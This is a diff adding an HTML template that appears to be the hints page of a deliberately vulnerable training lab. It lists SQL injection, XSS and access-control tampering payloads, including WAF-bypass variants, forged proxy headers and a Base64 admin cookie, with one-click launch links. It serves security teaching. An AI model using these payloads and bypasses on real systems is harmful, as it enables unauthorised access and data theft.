@@ -1,0 +1,246 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="bg-white rounded-xl border border-slate-200 p-6 shadow-sm space-y-1">
+    <div class="text-xs font-semibold uppercase tracking-wider text-amber-600">SECURITY LAB REFERENCE GUIDE</div>
+    <h1 class="text-xl font-bold text-slate-900">💡 Hints, One-Click Payloads & WAF Explanations</h1>
+    <p class="text-sm text-slate-600">
+        Unified exploit reference for all 3 UniMoodle modules (<strong>Gradebook SQLi</strong>, <strong>Course Forum XSS</strong>, and <strong>Dean's Office Burp Tampering</strong>) across <code class="px-1.5 py-0.5 rounded bg-slate-100 font-mono text-xs">Low</code>, <code class="px-1.5 py-0.5 rounded bg-slate-100 font-mono text-xs">Medium</code>, and <code class="px-1.5 py-0.5 rounded bg-slate-100 font-mono text-xs">High</code> difficulties.
+    </p>
+</div>
+
+<!-- ======================================================================= -->
+<!-- MODULE 1: GRADEBOOK SQL INJECTION (/sqli)                               -->
+<!-- ======================================================================= -->
+<section class="bg-white rounded-xl border border-slate-200 p-6 shadow-sm space-y-4 text-xs">
+    <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
+        <h2 class="text-base font-bold text-slate-900">1. 📊 Gradebook Lookup — SQL Injection (<code class="text-blue-600 font-mono">GET /sqli</code>)</h2>
+        <span class="font-mono text-[11px] text-slate-500">WAF Rules: WAF-SQLI-BASIC (L1) | WAF-SQLI-BYPASS (L2)</span>
+    </div>
+
+    <!-- 1. Summary Bar -->
+    <div class="p-3 rounded-lg bg-slate-50 border border-slate-200 text-slate-700">
+        <strong>Low:</strong> No filter. |
+        <strong>Medium:</strong> Blocks spaces (<code class="text-amber-700 font-mono">' '</code>) → bypassed with <code class="text-amber-700 font-mono">/**/</code>. |
+        <strong>High:</strong> Blocks spaces, <code class="text-purple-700 font-mono">/**/</code>, <code class="text-purple-700 font-mono">--</code>, and <code class="text-purple-700 font-mono">OR</code> → bypassed with quote-delimited <code class="text-purple-700 font-mono">admin'AND'1'='1</code>!
+    </div>
+
+    <!-- 2. One-Click Quick Launch Buttons -->
+    <div class="flex flex-wrap gap-2">
+        <a href="/sqli?query=alice" class="px-3 py-1.5 rounded-lg bg-slate-100 hover:bg-slate-200 border border-slate-300 text-slate-800 font-mono transition">
+            0. Benign Input: <strong>alice</strong>
+        </a>
+        <a href="/sqli?query=%27+OR+%271%27%3D%271" class="px-3 py-1.5 rounded-lg bg-rose-50 hover:bg-rose-100 border border-rose-300 text-rose-800 font-mono transition">
+            1. Launch Low: <strong>' OR '1'='1</strong>
+        </a>
+        <a href="/sqli?query=admin%27%2F%2A%2A%2FoR%2F%2A%2A%2F1%3D1--" class="px-3 py-1.5 rounded-lg bg-amber-50 hover:bg-amber-100 border border-amber-300 text-amber-900 font-mono transition">
+            2. Launch Medium: <strong>admin'/**/oR/**/1=1--</strong>
+        </a>
+        <a href="/sqli?query=admin%27AND%271%27%3D%271" class="px-3 py-1.5 rounded-lg bg-purple-50 hover:bg-purple-100 border border-purple-300 text-purple-900 font-mono transition">
+            3. Launch High: <strong>admin'AND'1'='1</strong>
+        </a>
+    </div>
+
+    <!-- 3. 3-Column Breakdown Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <div class="p-4 rounded-xl border border-rose-200 bg-rose-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-rose-700 uppercase">1. LOW: BOOLEAN TAUTOLOGY</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-emerald-100 text-emerald-800 font-semibold">Blocked by WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-rose-200 font-mono text-rose-800 select-all">' OR '1'='1</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Closes the opening quote in <code class="font-mono">WHERE username = '...'</code> and appends <code class="font-mono">OR '1'='1'</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Returns all rows in the <code class="font-mono">grades</code> table including the hidden <code class="font-mono">admin</code> exam key.</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-amber-200 bg-amber-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-amber-800 uppercase">2. MEDIUM: COMMENT WHITESPACE</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-amber-200 font-mono text-amber-900 select-all">admin'/**/oR/**/1=1--</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Replaces spaces with inline SQL comments (<code class="font-mono">/**/</code>) and truncates the query with <code class="font-mono">--</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Both Medium and <strong>WAF L1</strong> expect standard spaces (<code class="font-mono">' '</code>) around SQL keywords.</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-purple-200 bg-purple-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-purple-800 uppercase">3. HIGH: QUOTE-DELIMITED LOGIC</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-purple-200 font-mono text-purple-900 select-all">admin'AND'1'='1</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Uses single quotes (<code class="font-mono">'</code>) as token boundaries around <code class="font-mono">AND</code> without any spaces, comments, or <code class="font-mono">OR</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> High strips spaces, <code class="font-mono">/**/</code>, <code class="font-mono">--</code>, and <code class="font-mono">OR</code>, but SQLite parses <code class="font-mono">'admin'AND'1'='1'</code> as valid boolean truth!</p>
+        </div>
+    </div>
+
+    <!-- 4. WAF Paranoia L1 Reference Box -->
+    <div class="p-3.5 rounded-xl border border-blue-200 bg-blue-50/50 text-slate-700">
+        <div class="font-mono font-bold text-blue-800 uppercase text-[11px]">🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-SQLI-BASIC):</div>
+        <div class="mt-1">
+            Blocked by L1 (403):
+            <a href="/sqli?query=%27+OR+1%3D1+--" class="underline text-rose-700 font-mono mx-1">' OR 1=1 --</a> |
+            <a href="/sqli?query=%27+UNION+SELECT+1%2C2%2C3%2C4%2C5+--" class="underline text-rose-700 font-mono mx-1">' UNION SELECT 1,2,3,4,5 --</a>
+            • Bypasses L1 (Caught only by L2):
+            <a href="/sqli?query=admin%27%2F%2A%2A%2FoR%2F%2A%2A%2F1%3D1--" class="underline text-amber-800 font-mono mx-1">admin'/**/oR/**/1=1--</a> |
+            <a href="/sqli?query=admin%27AND%271%27%3D%271" class="underline text-purple-800 font-mono mx-1">admin'AND'1'='1</a>
+        </div>
+    </div>
+</section>
+
+<!-- ======================================================================= -->
+<!-- MODULE 2: COURSE FORUM XSS (/xss)                                       -->
+<!-- ======================================================================= -->
+<section class="bg-white rounded-xl border border-slate-200 p-6 shadow-sm space-y-4 text-xs">
+    <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
+        <h2 class="text-base font-bold text-slate-900">2. 💬 Course Forum — Cross-Site Scripting (<code class="text-blue-600 font-mono">GET & POST /xss</code>)</h2>
+        <span class="font-mono text-[11px] text-slate-500">WAF Rules: WAF-XSS-BASIC (L1) | WAF-XSS-BYPASS (L2)</span>
+    </div>
+
+    <!-- 1. Summary Bar -->
+    <div class="p-3 rounded-lg bg-slate-50 border border-slate-200 text-slate-700">
+        <strong>Low:</strong> No escaping. |
+        <strong>Medium:</strong> Strips <code class="text-amber-700 font-mono">&lt;script&gt;</code> tags → bypassed with <code class="text-amber-700 font-mono">&lt;img onerror=...&gt;</code>. |
+        <strong>High:</strong> Blocks <code class="text-purple-700 font-mono">&lt;script&gt;</code>, <code class="text-purple-700 font-mono">&lt;img&gt;</code>, <code class="text-purple-700 font-mono">onerror</code>, <code class="text-purple-700 font-mono">onload</code> → bypassed with HTML5 <code class="text-purple-700 font-mono">&lt;details open ontoggle=...&gt;</code>!
+    </div>
+
+    <!-- 2. One-Click Quick Launch Buttons -->
+    <div class="flex flex-wrap gap-2">
+        <a href="/xss?reflect=%3Cscript%3Ealert%28%27XSS-Low%27%29%3C%2Fscript%3E" class="px-3 py-1.5 rounded-lg bg-rose-50 hover:bg-rose-100 border border-rose-300 text-rose-800 font-mono transition">
+            1. Launch Low: <strong>&lt;script&gt;alert('XSS-Low')&lt;/script&gt;</strong>
+        </a>
+        <a href="/xss?reflect=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS-Medium%27%29%3E" class="px-3 py-1.5 rounded-lg bg-amber-50 hover:bg-amber-100 border border-amber-300 text-amber-900 font-mono transition">
+            2. Launch Medium: <strong>&lt;img src=x onerror=alert('XSS-Medium')&gt;</strong>
+        </a>
+        <a href="/xss?reflect=%3Cdetails+open+ontoggle%3Dalert%28%27XSS-High-Bypass%27%29%3EHigh%3C%2Fdetails%3E" class="px-3 py-1.5 rounded-lg bg-purple-50 hover:bg-purple-100 border border-purple-300 text-purple-900 font-mono transition">
+            3. Launch High: <strong>&lt;details open ontoggle=alert('XSS-High-Bypass')&gt;High&lt;/details&gt;</strong>
+        </a>
+    </div>
+
+    <!-- 3. 3-Column Breakdown Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <div class="p-4 rounded-xl border border-rose-200 bg-rose-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-rose-700 uppercase">1. LOW: DIRECT SCRIPT TAG</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-emerald-100 text-emerald-800 font-semibold">Blocked by WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-rose-200 font-mono text-rose-800 select-all">&lt;script&gt;alert('XSS-Low')&lt;/script&gt;</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Injects a direct <code class="font-mono">&lt;script&gt;</code> block into the forum search or comment feed.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Low performs zero sanitization. Caught by <code class="font-mono">WAF-XSS-BASIC</code> (L1).</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-amber-200 bg-amber-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-amber-800 uppercase">2. MEDIUM: EVENT ATTRIBUTE</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-amber-200 font-mono text-amber-900 select-all">&lt;img src=x onerror=alert('XSS-Medium')&gt;</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Triggers JavaScript via an image load error event instead of a <code class="font-mono">&lt;script&gt;</code> element.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Medium only removes <code class="font-mono">&lt;script&gt;</code> tags, and WAF L1 does not inspect event attributes.</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-purple-200 bg-purple-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-purple-800 uppercase">3. HIGH: HTML5 ONTOGGLE</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <div class="p-2 rounded bg-white border border-purple-200 font-mono text-purple-900 select-all">&lt;details open ontoggle=alert('XSS-High-Bypass')&gt;High&lt;/details&gt;</div>
+            <p class="text-slate-700"><strong>What it does:</strong> Uses an auto-opening HTML5 <code class="font-mono">&lt;details open&gt;</code> element with <code class="font-mono">ontoggle</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> High blocks <code class="font-mono">&lt;script&gt;</code>, <code class="font-mono">&lt;img&gt;</code>, <code class="font-mono">onerror</code>, and <code class="font-mono">onload</code>, overlooking <code class="font-mono">&lt;details ontoggle&gt;</code>!</p>
+        </div>
+    </div>
+
+    <!-- 4. WAF Paranoia L1 Reference Box -->
+    <div class="p-3.5 rounded-xl border border-blue-200 bg-blue-50/50 text-slate-700">
+        <div class="font-mono font-bold text-blue-800 uppercase text-[11px]">🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-XSS-BASIC):</div>
+        <div class="mt-1">
+            Blocked by L1 (403):
+            <a href="/xss?reflect=%3Cscript%3Ealert%281%29%3C%2Fscript%3E" class="underline text-rose-700 font-mono mx-1">&lt;script&gt;alert(1)&lt;/script&gt;</a> |
+            <a href="/xss?reflect=%3Ciframe+src%3Djavascript%3Aalert%281%29%3E" class="underline text-rose-700 font-mono mx-1">&lt;iframe src=javascript:alert(1)&gt;</a>
+            • Bypasses L1 (Caught only by L2):
+            <a href="/xss?reflect=%3Cimg+src%3Dx+onerror%3Dalert%28%27XSS-Medium%27%29%3E" class="underline text-amber-800 font-mono mx-1">&lt;img src=x onerror=alert(1)&gt;</a> |
+            <a href="/xss?reflect=%3Cdetails+open+ontoggle%3Dalert%28%27XSS-High-Bypass%27%29%3EHigh%3C%2Fdetails%3E" class="underline text-purple-800 font-mono mx-1">&lt;details open ontoggle=alert(1)&gt;</a>
+        </div>
+    </div>
+</section>
+
+<!-- ======================================================================= -->
+<!-- MODULE 3: DEAN'S OFFICE BURP TAMPERING (/vault)                         -->
+<!-- ======================================================================= -->
+<section class="bg-white rounded-xl border border-slate-200 p-6 shadow-sm space-y-4 text-xs">
+    <div class="flex flex-wrap items-center justify-between gap-2 border-b border-slate-100 pb-3">
+        <h2 class="text-base font-bold text-slate-900">3. 🏛️ Dean's Office Override — Burp Suite Tampering (<code class="text-blue-600 font-mono">POST /vault</code>)</h2>
+        <span class="font-mono text-[11px] text-slate-500">WAF Rules: WAF-BAC-BASIC (L1) | WAF-BAC-BYPASS (L2)</span>
+    </div>
+
+    <!-- 1. Summary Bar -->
+    <div class="p-3 rounded-lg bg-slate-50 border border-slate-200 text-slate-700">
+        <strong>Low:</strong> Trusts <code class="text-rose-700 font-mono">is_admin=true</code> or <code class="text-rose-700 font-mono">Cookie: user_role=admin</code>. |
+        <strong>Medium:</strong> Checks Base64 cookie <code class="text-amber-700 font-mono">auth_token=dXNlcj1hZG1pbg==</code> + <code class="text-amber-700 font-mono">X-Forwarded-For: 127.0.0.1</code>. |
+        <strong>High:</strong> Checks unsalted SHA-256 <code class="text-purple-700 font-mono">vault_sig</code> + <code class="text-purple-700 font-mono">X-Original-URL: /admin/vault</code>!
+    </div>
+
+    <!-- 2. One-Click Quick Launch Buttons -->
+    <form action="{{ url_for('vault_lab') }}" method="POST" class="flex flex-wrap gap-2">
+        <input type="hidden" name="is_admin" value="false">
+        <button type="submit" name="sim_exploit" value="low" class="px-3 py-1.5 rounded-lg bg-rose-50 hover:bg-rose-100 border border-rose-300 text-rose-800 font-mono transition">
+            1. One-Click Low Tamper: <strong>is_admin=true</strong>
+        </button>
+        <button type="submit" name="sim_exploit" value="medium" class="px-3 py-1.5 rounded-lg bg-amber-50 hover:bg-amber-100 border border-amber-300 text-amber-900 font-mono transition">
+            2. One-Click Medium Bypass: <strong>Base64 Cookie + X-Forwarded-For</strong>
+        </button>
+        <button type="submit" name="sim_exploit" value="high" class="px-3 py-1.5 rounded-lg bg-purple-50 hover:bg-purple-100 border border-purple-300 text-purple-900 font-mono transition">
+            3. One-Click High Bypass: <strong>SHA256 Sig + X-Original-URL</strong>
+        </button>
+    </form>
+
+    <!-- 3. 3-Column Breakdown Cards -->
+    <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+        <div class="p-4 rounded-xl border border-rose-200 bg-rose-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-rose-700 uppercase">1. LOW: FORM / COOKIE TAMPER</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-emerald-100 text-emerald-800 font-semibold">Blocked by WAF L1</span>
+            </div>
+            <pre class="p-2 rounded bg-white border border-rose-200 font-mono text-rose-800 text-[11px] overflow-x-auto">Cookie: user_role=admin
+is_admin=true</pre>
+            <p class="text-slate-700"><strong>What it does:</strong> Modifies <code class="font-mono">is_admin=true</code> in the POST body or sets <code class="font-mono">Cookie: user_role=admin</code> in Burp Proxy.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Low trusts unverified client parameters. Caught by <code class="font-mono">WAF-BAC-BASIC</code> (L1).</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-amber-200 bg-amber-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-amber-800 uppercase">2. MEDIUM: BASE64 + XFF HEADER</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <pre class="p-2 rounded bg-white border border-amber-200 font-mono text-amber-900 text-[11px] overflow-x-auto">X-Forwarded-For: 127.0.0.1
+Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==
+
+is_admin=false</pre>
+            <p class="text-slate-700"><strong>What it does:</strong> Base64-encodes <code class="font-mono">user=admin</code> (<code class="font-mono">dXNlcj1hZG1pbg==</code>) and adds <code class="font-mono">X-Forwarded-For: 127.0.0.1</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> WAF L1 does not decode Base64 cookies or inspect proxy headers!</p>
+        </div>
+
+        <div class="p-4 rounded-xl border border-purple-200 bg-purple-50/40 space-y-2">
+            <div class="flex items-center justify-between">
+                <span class="font-bold text-purple-800 uppercase">3. HIGH: SHA-256 FORGERY</span>
+                <span class="px-2 py-0.5 rounded text-[10px] bg-rose-100 text-rose-800 font-semibold">Bypasses WAF L1</span>
+            </div>
+            <pre class="p-2 rounded bg-white border border-purple-200 font-mono text-purple-900 text-[11px] overflow-x-auto">X-Forwarded-For: 127.0.0.1
+X-Original-URL: /admin/vault
+Cookie: user_role=guest; auth_token=dXNlcj1hZG1pbg==; vault_sig={{ admin_unsalted_sha256 }}
+
+is_admin=false</pre>
+            <p class="text-slate-700"><strong>What it does:</strong> Forges unsalted <code class="font-mono">sha256("user=admin")</code> in <code class="font-mono">vault_sig</code> + <code class="font-mono">X-Original-URL: /admin/vault</code>.</p>
+            <p class="text-slate-600"><strong>Why it works:</strong> Unsalted SHA-256 without a secret HMAC key can be computed by any attacker. Caught only by <strong>WAF L2</strong>!</p>
+        </div>
+    </div>
+
+    <!-- 4. WAF Paranoia L1 Reference Box -->
+    <div class="p-3.5 rounded-xl border border-blue-200 bg-blue-50/50 text-slate-700">
+        <div class="font-mono font-bold text-blue-800 uppercase text-[11px]">🛡️ WAF PARANOIA L1 TEST PAYLOADS (RULE: WAF-BAC-BASIC):</div>
+        <div class="mt-1">
+            Blocked by L1 (403): <code class="text-rose-700 font-mono">is_admin=true</code> | <code class="text-rose-700 font-mono">Cookie: user_role=admin</code>
+            • Bypasses L1 (Caught only by L2): <code class="text-amber-800 font-mono">auth_token=dXNlcj1hZG1pbg==</code> + <code class="text-purple-800 font-mono">X-Forwarded-For: 127.0.0.1</code> + <code class="text-purple-800 font-mono">X-Original-URL: /admin/vault</code>
+        </div>
+    </div>
+</section>
+{% endblock %}
